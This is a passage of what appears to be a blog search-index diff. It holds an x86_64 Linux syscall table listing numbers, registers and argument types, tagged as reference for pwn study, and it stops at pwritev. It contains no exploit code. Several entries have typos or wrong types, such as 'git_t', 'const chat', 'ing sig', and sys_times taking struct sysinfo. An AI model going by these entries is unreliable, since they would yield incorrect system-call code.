+pkey_free
+382.
+int pkey
+-
+-
+-
+-
+-
+
+
+383.
+statx
+383.
+int dfd
+const char *path
+unsigned flags
+unsigned mask
+struct statx *buffer
+-
+
+
+384.
+arch_prctl
+384.
+?
+?
+?
+?
+?
+?
+
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-所需表格</tag>
+        <tag>计算机原理相关表格</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>syscall调用表64位</title>
+    <url>//docx/syscall%E8%B0%83%E7%94%A8%E8%A1%A864%E4%BD%8D/</url>
+    <content><![CDATA[
+
+
+Num
+syscall
+%rax
+%rdi
+%rsi
+%rdx
+%rcx
+%r8
+%r9
+
+
+
+0.
+sys_read
+0.
+unsigned int fd
+char *buf
+size_t count
+
+
+
+
+
+1.
+sys_write
+1.
+unsigned int fd
+const char *buf
+size_t count
+
+
+
+
+
+2.
+sys_open
+2.
+const char *filename
+int flags
+int mode
+
+
+
+
+
+3.
+sys_close
+3.
+unsigned int fd
+
+
+
+
+
+
+
+4.
+sys_stat
+4.
+const char *filename
+struct stat *statbuf
+
+
+
+
+
+
+5.
+sys_fstat
+5.
+unsigned int fd
+struct stat *statbuf
+
+
+
+
+
+
+6.
+sys_lstat
+6.
+fconst char *filename
+struct stat *statbuf
+
+
+
+
+
+
+7.
+sys_poll
+7.
+struct poll_fd *ufds
+unsigned int nfds
+long timeout_msecs
+
+
+
+
+
+8.
+sys_lseek
+8.
+unsigned int fd
+off_t offset
+unsigned int origin
+
+
+
+
+
+9.
+sys_mmap
+9.
+unsigned long addr
+unsigned long len
+unsigned long prot
+unsigned long flags
+unsigned long fd
+unsigned long off
+
+
+10.
+sys_mprotect
+10.
+unsigned long start
+size_t len
+unsigned long prot
+
+
+
+
+
+11.
+sys_munmap
+11.
+unsigned long addr
+size_t len
+
+
+
+
+
+
+12.
+sys_brk
+12.
+unsigned long brk
+
+
+
+
+
+
+
+13.
+sys_rt_sigaction
+13.
+int sig
+const struct sigaction *act
+struct sigaction *oact
+size_t sigsetsize
+
+
+
+
+14.
+sys_rt_sigprocmask
+14.
+int how
+sigset_t *nset
+sigset_t *oset
+size_t sigsetsize
+
+
+
+
+15.
+sys_rt_sigreturn
+15.
+unsigned long __unused
+
+
+
+
+
+
+
+16.
+sys_ioctl
+16.
+unsigned int fd
+unsigned int cmd
+unsigned long arg
+
+
+
+
+
+17.
+sys_pread64
+17.
+unsigned long fd
+char *buf
+size_t count
+loff_t pos
+
+
+
+
+18.
+sys_pwrite64
+18.
+unsigned int fd
+const char *buf
+size_t count
+loff_t pos
+
+
+
+
+19.
+sys_readv
+19.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+
+
+
+
+
+20.
+sys_writev
+20.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+
+
+
+
+
+21.
+sys_access
+21.
+const char *filename
+int mode
+
+
+
+
+
+
+22.
+sys_pipe
+22.
+int *filedes
+
+
+
+
+
+
+
+23.
+sys_select
+23.
+int n
+fd_set *inp
+fd_set *outp
+fd_set*exp
+struct timeval *tvp
+
+
+
+24.
+sys_sched_yield
+24.
+
+
+
+
+
+
+
+
+25.
+sys_mremap
+25.
+unsigned long addr
+unsigned long old_len
+unsigned long new_len
+unsigned long flags
+unsigned long new_addr
+
+
+
+26.
+sys_msync
+26.
+unsigned long start
+size_t len
+int flags
+
+
+
+
+
+27.
+sys_mincore
+27.
+unsigned long start
+size_t len
+unsigned char *vec
+
+
+
+
+
+28.
+sys_madvise
+28.
+unsigned long start
+size_t len_in
+int behavior
+
+
+
+
+
+29.
+sys_shmget
+29.
+key_t key
+size_t size
+int shmflg
+
+
+
+
+
+30.
+sys_shmat
+30.
+int shmid
+char *shmaddr
+int shmflg
+
+
+
+
+
+31.
+sys_shmctl
+31.
+int shmid
+int cmd
+struct shmid_ds *buf
+
+
+
+
+
+32.
+sys_dup
+32.
+unsigned int fildes
+
+
+
+
+
+
+
+33.
+sys_dup2
+33.
+unsigned int oldfd
+unsigned int newfd
+
+
+
+
+
+
+34.
+sys_pause
+34.
+
+
+
+
+
+
+
+
+35.
+sys_nanosleep
+35.
+struct timespec *rqtp
+struct timespec *rmtp
+
+
+
+
+
+
+36.
+sys_getitimer
+36.
+int which
+struct itimerval *value
+
+
+
+
+
+
+37.
+sys_alarm
+37.
+unsigned int seconds
+
+
+
+
+
+
+
+38.
+sys_setitimer
+38.
+int which
+struct itimerval *value
+struct itimerval *ovalue
+
+
+
+
+
+39.
+sys_getpid
+39.
+
+
+
+
+
+
+
+
+40.
+sys_sendfile
+40.
+int out_fd
+int in_fd
+off_t *offset
+size_t count
+
+
+
+
+41.
+sys_socket
+41.
+int family
+int type
+int protocol
+
+
+
+
+
+42.
+sys_connect
+42.
+int fd
+struct sockaddr *uservaddr
+int addrlen
+
+
+
+
+
+43.
+sys_accept
+43.
+int fd
+struct sockaddr *upeer_sockaddr
+int *upeer_addrlen
+
+
+
+
+
+44.
+sys_sendto
+44.
+int fd
+void *buff
+size_t len
+unsigned flags
+struct sockaddr *addr
+int addr_len
+
+
+45.
+sys_recvfrom
+45.
+int fd
+void *ubuf
+size_t size
+unsigned flags
+struct sockaddr *addr
+int *addr_len
+
+
+46.
+sys_sendmsg
+46.
+int fd
+struct msghdr *msg
+unsigned flags
+
+
+
+
+
+47.
+sys_recvmsg
+47.
+int fd
+struct msghdr *msg
+unsigned int flags
+
+
+
+
+
+48.
+sys_shutdown
+48.
+int fd
+int how
+
+
+
+
+
+
+49.
+sys_bind
+49.
+int fd
+struct sokaddr *umyaddr
+int addrlen
+
+
+
+
+
+50.
+sys_listen
+50.
+int fd
+int backlog
+
+
+
+
+
+
+51.
+sys_getsockname
+51.
+int fd
+struct sockaddr *usockaddr
+int *usockaddr_len
+
+
+
+
+
+52.
+sys_getpeername
+52.
+int fd
+struct sockaddr *usockaddr
+int *usockaddr_len
+
+
+
+
+
+53.
+sys_socketpair
+53.
+int family
+int type
+int protocol
+int *usockvec
+
+
+
+
+54.
+sys_setsockopt
+54.
+int fd
+int level
+int optname
+char *optval
+int optlen
+
+
+
+55.
+sys_getsockopt
+55.
+int fd
+int level
+int optname
+char *optval
+int *optlen
+
+
+
+56.
+sys_clone
+56.
+unsigned long clone_flags
+unsigned long newsp
+void *parent_tid
+void *child_tid
+
+
+
+
+57.
+sys_fork
+57.
+
+
+
+
+
+
+
+
+58.
+sys_vfork
+58.
+
+
+
+
+
+
+
+
+59.
+sys_execve
+59.
+const char *filename
+const char *const argv[]
+const char *const envp[]
+
+
+
+
+
+60.
+sys_exit
+60.
+int error_code
+
+
+
+
+
+
+
+61.
+sys_wait4
+61.
+pid_t upid
+int *stat_addr
+int options
+struct rusage *ru
+
+
+
+
+62.
+sys_kill
+62.
+pid_t pid
+int sig
+
+
+
+
+
+
+63.
+sys_uname
+63.
+struct old_utsname *name
+
+
+
+
+
+
+
+64.
+sys_semget
+64.
+key_t key
+int nsems
+int semflg
+
+
+
+
+
+65.
+sys_semop
+65.
+int semid
+struct sembuf *tsops
+unsigned nsops
+
+
+
+
+
+66.
+sys_semctl
+66.
+int semid
+int semnum
+int cmd
+union semun arg
+
+
+
+
+67.
+sys_shmdt
+67.
+char *shmaddr
+
+
+
+
+
+
+
+68.
+sys_msgget
+68.
+key_t key
+int msgflg
+
+
+
+
+
+
+69.
+sys_msgsnd
+69.
+int msqid
+struct msgbuf *msgp
+size_t msgsz
+int msgflg
+
+
+
+
+70.
+sys_msgrcv
+70.
+int msqid
+struct msgbuf *msgp
+size_t msgsz
+long msgtyp
+int msgflg
+
+
+
+71.
+sys_msgctl
+71.
+int msqid
+int cmd
+struct msqid_ds *buf
+
+
+
+
+
+72.
+sys_fcntl
+72.
+unsigned int fd
+unsigned int cmd
+unsigned long arg
+
+
+
+
+
+73.
+sys_flock
+73.
+unsigned int fd
+unsigned int cmd
+
+
+
+
+
+
+74.
+sys_fsync
+74.
+unsigned int fd
+
+
+
+
+
+
+
+75.
+sys_fdatasync
+75.
+unsigned int fd
+
+
+
+
+
+
+
+76.
+sys_truncate
+76.
+const char *path
+long length
+
+
+
+
+
+
+77.
+sys_ftruncate
+77.
+unsigned int fd
+unsigned long length
+
+
+
+
+
+
+78.
+sys_getdents
+78.
+unsigned int fd
+struct linux_dirent *dirent
+unsigned int count
+
+
+
+
+
+79.
+sys_getcwd
+79.
+char *buf
+unsigned long size
+
+
+
+
+
+
+80.
+sys_chdir
+80.
+const char *filename
+
+
+
+
+
+
+
+81.
+sys_fchdir
+81.
+unsigned int fd
+
+
+
+
+
+
+
+82.
+sys_rename
+82.
+const char *oldname
+const char *newname
+
+
+
+
+
+
+83.
+sys_mkdir
+83.
+const char *pathname
+int mode
+
+
+
+
+
+
+84.
+sys_rmdir
+84.
+const char *pathname
+
+
+
+
+
+
+
+85.
+sys_creat
+85.
+const char *pathname
+int mode
+
+
+
+
+
+
+86.
+sys_link
+86.
+const char *oldname
+const char *newname
+
+
+
+
+
+
+87.
+sys_unlink
+87.
+const char *pathname
+
+
+
+
+
+
+
+88.
+sys_symlink
+88.
+const char *oldname
+const char *newname
+
+
+
+
+
+
+89.
+sys_readlink
+89.
+const char *path
+char *buf
+int bufsiz
+
+
+
+
+
+90.
+sys_chmod
+90.
+const char *filename
+mode_t mode
+
+
+
+
+
+
+91.
+sys_fchmod
+91.
+unsigned int fd
+mode_t mode
+
+
+
+
+
+
+92.
+sys_chown
+92.
+const char *filename
+uid_t user
+git_t group
+
+
+
+
+
+93.
+sys_fchown
+93.
+unsigned int fd
+uid_t user
+git_t group
+
+
+
+
+
+94.
+sys_lchown
+94.
+const char *filename
+uid_t user
+git_t group
+
+
+
+
+
+95.
+sys_umask
+95.
+int mask
+
+
+
+
+
+
+
+96.
+sys_gettimeofday
+96.
+struct timeval *tv
+struct timezone *tz
+
+
+
+
+
+
+97.
+sys_getrlimit
+97.
+unsigned int resource
+struct rlimit *rlim
+
+
+
+
+
+
+98.
+sys_getrusage
+98.
+int who
+struct rusage *ru
+
+
+
+
+
+
+99.
+sys_sysinfo
+99.
+struct sysinfo *info
+
+
+
+
+
+
+
+100.
+sys_times
+100.
+struct sysinfo *info
+
+
+
+
+
+
+
+101.
+sys_ptrace
+101.
+long request
+long pid
+unsigned long addr
+unsigned long data
+
+
+
+
+102.
+sys_getuid
+102.
+
+
+
+
+
+
+
+
+103.
+sys_syslog
+103.
+int type
+char *buf
+int len
+
+
+
+
+
+104.
+sys_getgid
+104.
+
+
+
+
+
+
+
+
+105.
+sys_setuid
+105.
+uid_t uid
+
+
+
+
+
+
+
+106.
+sys_setgid
+106.
+git_t gid
+
+
+
+
+
+
+
+107.
+sys_geteuid
+107.
+
+
+
+
+
+
+
+
+108.
+sys_getegid
+108.
+
+
+
+
+
+
+
+
+109.
+sys_setpgid
+109.
+pid_t pid
+pid_t pgid
+
+
+
+
+
+
+110.
+sys_getppid
+110.
+
+
+
+
+
+
+
+
+111.
+sys_getpgrp
+111.
+
+
+
+
+
+
+
+
+112.
+sys_setsid
+112.
+
+
+
+
+
+
+
+
+113.
+sys_setreuid
+113.
+uid_t ruid
+uid_t euid
+
+
+
+
+
+
+114.
+sys_setregid
+114.
+git_t rgid
+gid_t egid
+
+
+
+
+
+
+115.
+sys_getgroups
+115.
+int gidsetsize
+gid_t *grouplist
+
+
+
+
+
+
+116.
+sys_setgroups
+116.
+int gidsetsize
+gid_t *grouplist
+
+
+
+
+
+
+117.
+sys_setresuid
+117.
+uid_t *ruid
+uid_t *euid
+uid_t *suid
+
+
+
+
+
+118.
+sys_getresuid
+118.
+uid_t *ruid
+uid_t *euid
+uid_t *suid
+
+
+
+
+
+119.
+sys_setresgid
+119.
+gid_t rgid
+gid_t egid
+gid_t sgid
+
+
+
+
+
+120.
+sys_getresgid
+120.
+git_t *rgid
+git_t *egid
+git_t *sgid
+
+
+
+
+
+121.
+sys_getpgid
+121.
+pid_t pid
+
+
+
+
+
+
+
+122.
+sys_setfsuid
+122.
+uid_t uid
+
+
+
+
+
+
+
+123.
+sys_setfsgid
+123.
+gid_t gid
+
+
+
+
+
+
+
+124.
+sys_getsid
+124.
+pid_t pid
+
+
+
+
+
+
+
+125.
+sys_capget
+125.
+cap_user_header_t header
+cap_user_data_t dataptr
+
+
+
+
+
+
+126.
+sys_capset
+126.
+cap_user_header_t header
+const cap_user_data_t data
+
+
+
+
+
+
+127.
+sys_rt_sigpending
+127.
+sigset_t *set
+size_t sigsetsize
+
+
+
+
+
+
+128.
+sys_rt_sigtimedwait
+128.
+const sigset_t *uthese
+siginfo_t *uinfo
+const struct timespec *uts
+size_t sigsetsize
+
+
+
+
+129.
+sys_rt_sigqueueinfo
+129.
+pid_t pid
+int sig
+siginfo_t *uinfo
+
+
+
+
+
+130.
+sys_rt_sigsuspend
+130.
+sigset_t *unewset
+size_t sigsetsize
+
+
+
+
+
+
+131.
+sys_sigaltstack
+131.
+const stack_t *uss
+stack_t *uoss
+
+
+
+
+
+
+132.
+sys_utime
+132.
+char *filename
+struct utimbuf *times
+
+
+
+
+
+
+133.
+sys_mknod
+133.
+const char *filename
+int mode
+unsigned dev
+
+
+
+
+
+134.
+sys_uselib
+134.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+135.
+sys_personality
+135.
+unsigned int personality
+
+
+
+
+
+
+
+136.
+sys_ustat
+136.
+unsigned dev
+struct ustat *ubuf
+
+
+
+
+
+
+137.
+sys_statfs
+137.
+const char *pathname
+struct statfs *buf
+
+
+
+
+
+
+138.
+sys_fstatfs
+138.
+unsigned int fd
+struct statfs *buf
+
+
+
+
+
+
+139.
+sys_sysfs
+139.
+int option
+unsigned long arg1
+unsigned long arg2
+
+
+
+
+
+140.
+sys_getpriority
+140.
+int which
+int who
+
+
+
+
+
+
+141.
+sys_setpriority
+141.
+int which
+int who
+int niceval
+
+
+
+
+
+142.
+sys_sched_setparam
+142.
+pid_t pid
+struct sched_param *param
+
+
+
+
+
+
+143.
+sys_sched_getparam
+143.
+pid_t pid
+struct sched_param *param
+
+
+
+
+
+
+144.
+sys_sched_setscheduler
+144.
+pid_t pid
+int policy
+struct sched_param *param
+
+
+
+
+
+145.
+sys_sched_getscheduler
+145.
+pid_t pid
+
+
+
+
+
+
+
+146.
+sys_sched_get_priority_max
+146.
+int policy
+
+
+
+
+
+
+
+147.
+sys_sched_get_priority_min
+147.
+int policy
+
+
+
+
+
+
+
+148.
+sys_sched_rr_get_interval
+148.
+pid_t pid
+struct timespec *interval
+
+
+
+
+
+
+149.
+sys_mlock
+149.
+unsigned long start
+size_t len
+
+
+
+
+
+
+150.
+sys_munlock
+150.
+unsigned long start
+size_t len
+
+
+
+
+
+
+151.
+sys_mlockall
+151.
+int flags
+
+
+
+
+
+
+
+152.
+sys_munlockall
+152.
+
+
+
+
+
+
+
+
+153.
+sys_vhangup
+153.
+
+
+
+
+
+
+
+
+154.
+sys_modify_ldt
+154.
+int func
+void *ptr
+unsigned long bytecount
+
+
+
+
+
+155.
+sys_pivot_root
+155.
+const char *new_root
+const char *put_old
+
+
+
+
+
+
+156.
+sys__sysctl
+156.
+struct __sysctl_args *args
+
+
+
+
+
+
+
+157.
+sys_prctl
+157.
+int option
+unsigned long arg2
+unsigned long arg3
+unsigned long arg4
+unsigned long arg5
+
+
+
+158.
+sys_arch_prctl
+158.
+struct task_struct *task
+int code
+unsigned long *addr
+
+
+
+
+
+159.
+sys_adjtimex
+159.
+struct timex *txc_p
+
+
+
+
+
+
+
+160.
+sys_setrlimit
+160.
+unsigned int resource
+struct rlimit *rlim
+
+
+
+
+
+
+161.
+sys_chroot
+161.
+const char *filename
+
+
+
+
+
+
+
+162.
+sys_sync
+162.
+
+
+
+
+
+
+
+
+163.
+sys_acct
+163.
+const char *name
+
+
+
+
+
+
+
+164.
+sys_settimeofday
+164.
+struct timeval *tv
+struct timezone *tz
+
+
+
+
+
+
+165.
+sys_mount
+165.
+char *dev_name
+char *dir_name
+char *type
+unsigned long flags
+void *data
+
+
+
+166.
+sys_umount2
+166.
+const char *target
+int flags
+
+
+
+
+
+
+167.
+sys_swapon
+167.
+const char *specialfile
+int swap_flags
+
+
+
+
+
+
+168.
+sys_swapoff
+168.
+const char *specialfile
+
+
+
+
+
+
+
+169.
+sys_reboot
+169.
+int magic1
+int magic2
+unsigned int cmd
+void *arg
+
+
+
+
+170.
+sys_sethostname
+170.
+char *name
+int len
+
+
+
+
+
+
+171.
+sys_setdomainname
+171.
+char *name
+int len
+
+
+
+
+
+
+172.
+sys_iopl
+172.
+unsigned int level
+struct pt_regs *regs
+
+
+
+
+
+
+173.
+sys_ioperm
+173.
+unsigned long from
+unsigned long num
+int turn_on
+
+
+
+
+
+174.
+sys_create_module
+174.
+REMOVED IN Linux 2.6
+
+
+
+
+
+
+
+175.
+sys_init_module
+175.
+void *umod
+unsigned long len
+const char *uargs
+
+
+
+
+
+176.
+sys_delete_module
+176.
+const chat *name_user
+unsigned int flags
+
+
+
+
+
+
+177.
+sys_get_kernel_syms
+177.
+REMOVED IN Linux 2.6
+
+
+
+
+
+
+
+178.
+sys_query_module
+178.
+REMOVED IN Linux 2.6
+
+
+
+
+
+
+
+179.
+sys_quotactl
+179.
+unsigned int cmd
+const char *special
+qid_t id
+void *addr
+
+
+
+
+180.
+sys_nfsservctl
+180.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+181.
+sys_getpmsg
+181.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+182.
+sys_putpmsg
+182.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+183.
+sys_afs_syscall
+183.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+184.
+sys_tuxcall
+184.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+185.
+sys_security
+185.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+186.
+sys_gettid
+186.
+
+
+
+
+
+
+
+
+187.
+sys_readahead
+187.
+int fd
+loff_t offset
+size_t count
+
+
+
+
+
+188.
+sys_setxattr
+188.
+const char *pathname
+const char *name
+const void *value
+size_t size
+int flags
+
+
+
+189.
+sys_lsetxattr
+189.
+const char *pathname
+const char *name
+const void *value
+size_t size
+int flags
+
+
+
+190.
+sys_fsetxattr
+190.
+int fd
+const char *name
+const void *value
+size_t size
+int flags
+
+
+
+191.
+sys_getxattr
+191.
+const char *pathname
+const char *name
+void *value
+size_t size
+
+
+
+
+192.
+sys_lgetxattr
+192.
+const char *pathname
+const char *name
+void *value
+size_t size
+
+
+
+
+193.
+sys_fgetxattr
+193.
+int fd
+const har *name
+void *value
+size_t size
+
+
+
+
+194.
+sys_listxattr
+194.
+const char *pathname
+char *list
+size_t size
+
+
+
+
+
+195.
+sys_llistxattr
+195.
+const char *pathname
+char *list
+size_t size
+
+
+
+
+
+196.
+sys_flistxattr
+196.
+int fd
+char *list
+size_t size
+
+
+
+
+
+197.
+sys_removexattr
+197.
+const char *pathname
+const char *name
+
+
+
+
+
+
+198.
+sys_lremovexattr
+198.
+const char *pathname
+const char *name
+
+
+
+
+
+
+199.
+sys_fremovexattr
+199.
+int fd
+const char *name
+
+
+
+
+
+
+200.
+sys_tkill
+200.
+pid_t pid
+ing sig
+
+
+
+
+
+
+201.
+sys_time
+201.
+time_t *tloc
+
+
+
+
+
+
+
+202.
+sys_futex
+202.
+u32 *uaddr
+int op
+u32 val
+struct timespec *utime
+u32 *uaddr2
+u32 val3
+
+
+203.
+sys_sched_setaffinity
+203.
+pid_t pid
+unsigned int len
+unsigned long *user_mask_ptr
+
+
+
+
+
+204.
+sys_sched_getaffinity
+204.
+pid_t pid
+unsigned int len
+unsigned long *user_mask_ptr
+
+
+
+
+
+205.
+sys_set_thread_area
+205.
+NOT IMPLEMENTED. Use arch_prctl
+
+
+
+
+
+
+
+206.
+sys_io_setup
+206.
+unsigned nr_events
+aio_context_t *ctxp
+
+
+
+
+
+
+207.
+sys_io_destroy
+207.
+aio_context_t ctx
+
+
+
+
+
+
+
+208.
+sys_io_getevents
+208.
+aio_context_t ctx_id
+long min_nr
+long nr
+struct io_event *events
+
+
+
+
+209.
+sys_io_submit
+209.
+aio_context_t ctx_id
+long nr
+struct iocb **iocbpp
+
+
+
+
+
+210.
+sys_io_cancel
+210.
+aio_context_t ctx_id
+struct iocb *iocb
+struct io_event *result
+
+
+
+
+
+211.
+sys_get_thread_area
+211.
+NOT IMPLEMENTED. Use arch_prctl
+
+
+
+
+
+
+
+212.
+sys_lookup_dcookie
+212.
+u64 cookie64
+long buf
+long len
+
+
+
+
+
+213.
+sys_epoll_create
+213.
+int size
+
+
+
+
+
+
+
+214.
+sys_epoll_ctl_old
+214.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+215.
+sys_epoll_wait_old
+215.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+216.
+sys_remap_file_pages
+216.
+unsigned long start
+unsigned long size
+unsigned long prot
+unsigned long pgoff
+unsigned long flags
+
+
+
+217.
+sys_getdents64
+217.
+unsigned int fd
+struct linux_dirent64 *dirent
+unsigned int count
+
+
+
+
+
+218.
+sys_set_tid_address
+218.
+int *tidptr
+
+
+
+
+
+
+
+219.
+sys_restart_syscall
+219.
+
+
+
+
+
+
+
+
+220.
+sys_semtimedop
+220.
+int semid
+struct sembuf *tsops
+unsigned nsops
+const struct timespec *timeout
+
+
+
+
+221.
+sys_fadvise64
+221.
+int fd
+loff_t offset
+size_t len
+int advice
+
+
+
+
+222.
+sys_timer_create
+222.
+const clockid_t which_clock
+struct sigevent *timer_event_spec
+timer_t *created_timer_id
+
+
+
+
+
+223.
+sys_timer_settime
+223.
+timer_t timer_id
+int flags
+const struct itimerspec *new_setting
+struct itimerspec *old_setting
+
+
+
+
+224.
+sys_timer_gettime
+224.
+timer_t timer_id
+struct itimerspec *setting
+
+
+
+
+
+
+225.
+sys_timer_getoverrun
+225.
+timer_t timer_id
+
+
+
+
+
+
+
+226.
+sys_timer_delete
+226.
+timer_t timer_id
+
+
+
+
+
+
+
+227.
+sys_clock_settime
+227.
+const clockid_t which_clock
+const struct timespec *tp
+
+
+
+
+
+
+228.
+sys_clock_gettime
+228.
+const clockid_t which_clock
+struct timespec *tp
+
+
+
+
+
+
+229.
+sys_clock_getres
+229.
+const clockid_t which_clock
+struct timespec *tp
+
+
+
+
+
+
+230.
+sys_clock_nanosleep
+230.
+const clockid_t which_clock
+int flags
+const struct timespec *rqtp
+struct timespec *rmtp
+
+
+
+
+231.
+sys_exit_group
+231.
+int error_code
+
+
+
+
+
+
+
+232.
+sys_epoll_wait
+232.
+int epfd
+struct epoll_event *events
+int maxevents
+int timeout
+
+
+
+
+233.
+sys_epoll_ctl
+233.
+int epfd
+int op
+int fd
+struct epoll_event *event
+
+
+
+
+234.
+sys_tgkill
+234.
+pid_t tgid
+pid_t pid
+int sig
+
+
+
+
+
+235.
+sys_utimes
+235.
+char *filename
+struct timeval *utimes
+
+
+
+
+
+
+236.
+sys_vserver
+236.
+NOT IMPLEMENTED
+
+
+
+
+
+
+
+237.
+sys_mbind
+237.
+unsigned long start
+unsigned long len
+unsigned long mode
+unsigned long *nmask
+unsigned long maxnode
+unsigned flags
+
+
+238.
+sys_set_mempolicy
+238.
+int mode
+unsigned long *nmask
+unsigned long maxnode
+
+
+
+
+
+239.
+sys_get_mempolicy
+239.
+int *policy
+unsigned long *nmask
+unsigned long maxnode
+unsigned long addr
+unsigned long flags
+
+
+
+240.
+sys_mq_open
+240.
+const char *u_name
+int oflag
+mode_t mode
+struct mq_attr *u_attr
+
+
+
+
+241.
+sys_mq_unlink
+241.
+const char *u_name
+
+
+
+
+
+
+
+242.
+sys_mq_timedsend
+242.
+mqd_t mqdes
+const char *u_msg_ptr
+size_t msg_len
+unsigned int msg_prio
+const stuct timespec *u_abs_timeout
+
+
+
+243.
+sys_mq_timedreceive
+243.
+mqd_t mqdes
+char *u_msg_ptr
+size_t msg_len
+unsigned int *u_msg_prio
+const struct timespec *u_abs_timeout
+
+
+
+244.
+sys_mq_notify
+244.
+mqd_t mqdes
+const struct sigevent *u_notification
+
+
+
+
+
+
+245.
+sys_mq_getsetattr
+245.
+mqd_t mqdes
+const struct mq_attr *u_mqstat
+struct mq_attr *u_omqstat
+
+
+
+
+
+246.
+sys_kexec_load
+246.
+unsigned long entry
+unsigned long nr_segments
+struct kexec_segment *segments
+unsigned long flags
+
+
+
+
+247.
+sys_waitid
+247.
+int which
+pid_t upid
+struct siginfo *infop
+int options
+struct rusage *ru
+
+
+
+248.
+sys_add_key
+248.
+const char *_type
+const char *_description
+const void *_payload
+size_t plen
+
+
+
+
+249.
+sys_request_key
+249.
+const char *_type
+const char *_description
+const char *_callout_info
+key_serial_t destringid
+
+
+
+
+250.
+sys_keyctl
+250.
+int option
+unsigned long arg2
+unsigned long arg3
+unsigned long arg4
+unsigned long arg5
+
+
+
+251.
+sys_ioprio_set
+251.
+int which
+int who
+int ioprio
+
+
+
+
+
+252.
+sys_ioprio_get
+252.
+int which
+int who
+
+
+
+
+
+
+253.
+sys_inotify_init
+253.
+
+
+
+
+
+
+
+
+254.
+sys_inotify_add_watch
+254.
+int fd
+const char *pathname
+u32 mask
+
+
+
+
+
+255.
+sys_inotify_rm_watch
+255.
+int fd
+__s32 wd
+
+
+
+
+
+
+256.
+sys_migrate_pages
+256.
+pid_t pid
+unsigned long maxnode
+const unsigned long *old_nodes
+const unsigned long *new_nodes
+
+
+
+
+257.
+sys_openat
+257.
+int dfd
+const char *filename
+int flags
+int mode
+
+
+
+
+258.
+sys_mkdirat
+258.
+int dfd
+const char *pathname
+int mode
+
+
+
+
+
+259.
+sys_mknodat
+259.
+int dfd
+const char *filename
+int mode
+unsigned dev
+
+
+
+
+260.
+sys_fchownat
+260.
+int dfd
+const char *filename
+uid_t user
+gid_t group
+int flag
+
+
+
+261.
+sys_futimesat
+261.
+int dfd
+const char *filename
+struct timeval *utimes
+
+
+
+
+
+262.
+sys_newfstatat
+262.
+int dfd
+const char *filename
+struct stat *statbuf
+int flag
+
+
+
+
+263.
+sys_unlinkat
+263.
+int dfd
+const char *pathname
+int flag
+
+
+
+
+
+264.
+sys_renameat
+264.
+int oldfd
+const char *oldname
+int newfd
+const char *newname
+
+
+
+
+265.
+sys_linkat
+265.
+int oldfd
+const char *oldname
+int newfd
+const char *newname
+int flags
+
+
+
+266.
+sys_symlinkat
+266.
+const char *oldname
+int newfd
+const char *newname
+
+
+
+
+
+267.
+sys_readlinkat
+267.
+int dfd
+const char *pathname
+char *buf
+int bufsiz
+
+
+
+
+268.
+sys_fchmodat
+268.
+int dfd
+const char *filename
+mode_t mode
+
+
+
+
+
+269.
+sys_faccessat
+269.
+int dfd
+const char *filename
+int mode
+
+
+
+
+
+270.
+sys_pselect6
+270.
+int n
+fd_set *inp
+fd_set *outp
+fd_set *exp
+struct timespec *tsp
+void *sig
+
+
+271.
+sys_ppoll
+271.
+struct pollfd *ufds
+unsigned int nfds
+struct timespec *tsp
+const sigset_t *sigmask
+size_t sigsetsize
+
+
+
+272.
+sys_unshare
+272.
+unsigned long unshare_flags
+
+
+
+
+
+
+
+273.
+sys_set_robust_list
+273.
+struct robust_list_head *head
+size_t len
+
+
+
+
+
+
+274.
+sys_get_robust_list
+274.
+int pid
+struct robust_list_head **head_ptr
+size_t *len_ptr
+
+
+
+
+
+275.
+sys_splice
+275.
+int fd_in
+loff_t *off_in
+int fd_out
+loff_t *off_out
+size_t len
+unsigned int flags
+
+
+276.
+sys_tee
+276.
+int fdin
+int fdout
+size_t len
+unsigned int flags
+
+
+
+
+277.
+sys_sync_file_range
+277.
+long fd
+loff_t offset
+loff_t bytes
+long flags
+
+
+
+
+278.
+sys_vmsplice
+278.
+int fd
+const struct iovec *iov
+unsigned long nr_segs
+unsigned int flags
+
+
+
+
+279.
+sys_move_pages
+279.
+pid_t pid
+unsigned long nr_pages
+const void **pages
+const int *nodes
+int *status
+int flags
+
+
+280.
+sys_utimensat
+280.
+int dfd
+const char *filename
+struct timespec *utimes
+int flags
+
+
+
+
+281.
+sys_epoll_pwait
+281.
+int epfd
+struct epoll_event *events
+int maxevents
+int timeout
+const sigset_t *sigmask
+size_t sigsetsize
+
+
+282.
+sys_signalfd
+282.
+int ufd
+sigset_t *user_mask
+size_t sizemask
+
+
+
+
+
+283.
+sys_timerfd_create
+283.
+int clockid
+int flags
+
+
+
+
+
+
+284.
+sys_eventfd
+284.
+unsigned int count
+
+
+
+
+
+
+
+285.
+sys_fallocate
+285.
+long fd
+long mode
+loff_t offset
+loff_t len
+
+
+
+
+286.
+sys_timerfd_settime
+286.
+int ufd
+int flags
+const struct itimerspec *utmr
+struct itimerspec *otmr
+
+
+
+
+287.
+sys_timerfd_gettime
+287.
+int ufd
+struct itimerspec *otmr
+
+
+
+
+
+
+288.
+sys_accept4
+288.
+int fd
+struct sockaddr *upeer_sockaddr
+int *upeer_addrlen
+int flags
+
+
+
+
+289.
+sys_signalfd4
+289.
+int ufd
+sigset_t *user_mask
+size_t sizemask
+int flags
+
+
+
+
+290.
+sys_eventfd2
+290.
+unsigned int count
+int flags
+
+
+
+
+
+
+291.
+sys_epoll_create1
+291.
+int flags
+
+
+
+
+
+
+
+292.
+sys_dup3
+292.
+unsigned int oldfd
+unsigned int newfd
+int flags
+
+
+
+
+
+293.
+sys_pipe2
+293.
+int *filedes
+int flags
+
+
+
+
+
+
+294.
+sys_inotify_init1
+294.
+int flags
+
+
+
+
+
+
+
+295.
+sys_preadv
+295.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+unsigned long pos_l
+unsigned long pos_h
+
+
+
+296.
+sys_pwritev
+296.
+unsigned long fd
+const struct iovec *vec
+unsigned long vlen
+unsigned long pos_l
